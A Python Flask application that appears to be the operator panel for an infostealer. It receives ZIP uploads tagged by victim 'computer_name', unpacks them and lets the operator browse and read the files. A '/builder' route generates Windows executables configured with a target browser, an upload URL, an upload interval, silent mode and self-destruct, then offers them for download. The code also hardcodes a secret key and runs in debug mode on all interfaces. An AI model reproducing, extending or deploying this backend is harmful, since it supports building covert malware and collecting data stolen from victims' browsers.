from flask import Flask, render_template, request, send_from_directory, flash, redirect, url_for, Response
import os
import zipfile
import shutil
from builder import build_executable
import re

app = Flask(__name__)
app.secret_key = "supersecretkey"

# Base directory for webapp
BASE_DIR = "/app/webapp"

# Directories
UPLOAD_FOLDER = os.path.join(BASE_DIR, "uploads")
UNZIPPED_FOLDER = os.path.join(BASE_DIR, "unzipped")
STATIC_FOLDER = os.path.join(BASE_DIR, "static")
BUILD_FOLDER = os.path.join(STATIC_FOLDER, "builds")

# Ensure directories exist
print("Creating directories if they don't exist")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(UNZIPPED_FOLDER, exist_ok=True)
os.makedirs(STATIC_FOLDER, exist_ok=True)
os.makedirs(BUILD_FOLDER, exist_ok=True)
print(f"Directories created: {UPLOAD_FOLDER}, {UNZIPPED_FOLDER}, {STATIC_FOLDER}, {BUILD_FOLDER}")

@app.route("/")
def index():
    print("Redirecting to /uploads")
    return redirect(url_for("uploads"))

@app.route("/uploads")
def uploads():
    print(f"Listing ZIP files in {UPLOAD_FOLDER}")
    zip_files = [f for f in os.listdir(UPLOAD_FOLDER) if f.endswith(".zip")]
    print(f"ZIP files found: {zip_files}")
    print(f"Listing folders in {UNZIPPED_FOLDER}")
    unzipped_folders = [f for f in os.listdir(UNZIPPED_FOLDER) if os.path.isdir(os.path.join(UNZIPPED_FOLDER, f))]
    print(f"Unzipped folders found: {unzipped_folders}")
    return render_template("uploads.html", zip_files=zip_files, unzipped_folders=unzipped_folders)

@app.route("/file_upload", methods=["POST"])
def file_upload():
    if "file" not in request.files or "computer_name" not in request.form:
        print("Error: Missing file or computer name")
        return {"error": "Missing file or computer name"}, 400

    file = request.files["file"]
    computer_name = re.sub(r'[^\w-]', '_', request.form["computer_name"]) 
    print(f"Received upload request for computer: {computer_name}")

    if file.filename == "":
        print("Error: No file selected")
        return {"error": "No file selected"}, 400

    if file and file.filename.endswith(".zip"):
        zip_filename = f"{computer_name}.zip"
        zip_path = os.path.join(UPLOAD_FOLDER, zip_filename)
        print(f"Saving ZIP to {zip_path}")
        file.save(zip_path)
        print(f"Saved ZIP: {zip_path}")

        unzip_path = os.path.join(UNZIPPED_FOLDER, computer_name)
        print(f"Extracting ZIP to {unzip_path}")
        os.makedirs(unzip_path, exist_ok=True)
        with zipfile.ZipFile(zip_path, "r") as zip_ref:
            zip_ref.extractall(unzip_path)
        print(f"Extracted ZIP to {unzip_path}")

        return {"status": "success", "computer_name": computer_name}, 200

    print("Error: Invalid file type")
    return {"error": "Invalid file type"}, 400

@app.route("/files/<path:filename>")
def serve_file(filename):
    if filename.endswith(".zip"):
        print(f"Serving ZIP file: {filename} from {UPLOAD_FOLDER}")
        return send_from_directory(UPLOAD_FOLDER, filename)
    elif filename.endswith(".exe") and filename.startswith("builds/"):
        # Remove 'builds/' prefix for BUILD_FOLDER
        build_filename = filename[len("builds/"):]
        print(f"Serving executable: {build_filename} from {BUILD_FOLDER}")
        return send_from_directory(BUILD_FOLDER, build_filename)
    print(f"Serving unzipped file: {filename} from {UNZIPPED_FOLDER}")
    return send_from_directory(UNZIPPED_FOLDER, filename)

@app.route("/view/<path:filename>")
def view_file(filename):
    file_path = os.path.join(UNZIPPED_FOLDER, filename)
    print(f"Viewing file: {file_path}")
    if not os.path.isfile(file_path):
        print(f"Error: File not found: {file_path}")
        return {"error": "File not found"}, 404
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        print(f"Successfully read file: {file_path}")
        return Response(content, mimetype='text/plain')
    except (UnicodeDecodeError, IOError):
        print(f"Error: Cannot read file as text: {file_path}")
        return {"error": "Cannot read file as text"}, 400

@app.route("/explore/<path:folder>")
def explore_folder(folder):
    print(f"Exploring folder: {folder}")
    folder_path = os.path.join(UNZIPPED_FOLDER, folder)
    print(f"Folder path: {folder_path}")
    if not os.path.isdir(folder_path):
        print(f"Error: Folder not found: {folder_path}")
        return {"error": "Folder not found"}, 404

    items = []
    for item in os.listdir(folder_path):
        item_path = os.path.join(folder_path, item)
        rel_path = os.path.relpath(item_path, UNZIPPED_FOLDER)
        items.append({
            "name": item,
            "path": rel_path,
            "is_dir": os.path.isdir(item_path)
        })
    print(f"Items in {folder_path}: {items}")
    return {"items": items}

@app.route("/builder", methods=["GET", "POST"])
def builder():
    print(f"Listing executables in {BUILD_FOLDER}")
    exe_files = [f for f in os.listdir(BUILD_FOLDER) if f.endswith(".exe")]
    print(f"Executables found: {exe_files}")
    
    if request.method == "POST":
        exe_name = request.form.get("exe_name")
        upload_url = request.form.get("upload_url")
        target_browser = int(request.form.get("target_browser"))
        upload_interval = int(request.form.get("upload_interval"))
        self_destruct = "self_destruct" in request.form
        silent = "silent" in request.form

        print(f"Building executable: {exe_name} with URL: {upload_url}, browser: {target_browser}, interval: {upload_interval}, self_destruct: {self_destruct}, silent: {silent}")

        if not exe_name.endswith(".exe") or not re.match(r'^[a-zA-Z0-9_-]+\.exe$', exe_name):
            print(f"Error: Invalid executable name: {exe_name}")
            flash("Executable name must end with .exe and contain only letters, numbers, underscores, or hyphens", "error")
            return redirect(url_for("builder"))

        success, result = build_executable(
            exe_name=exe_name,
            upload_url=upload_url,
            target_browser=target_browser,
            upload_interval=upload_interval,
            self_destruct=self_destruct,
            silent=silent,
            output_dir=BUILD_FOLDER
        )

        if success:
            print(f"Executable built successfully: {result}")
            flash("Executable built successfully! Download it from the table below.", "success")
            return redirect(url_for("builder"))
        else:
            print(f"Build failed: {result}")
            flash(f"Build failed: {result}", "error")
            return redirect(url_for("builder"))

    return render_template("builder.html", exe_files=exe_files)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)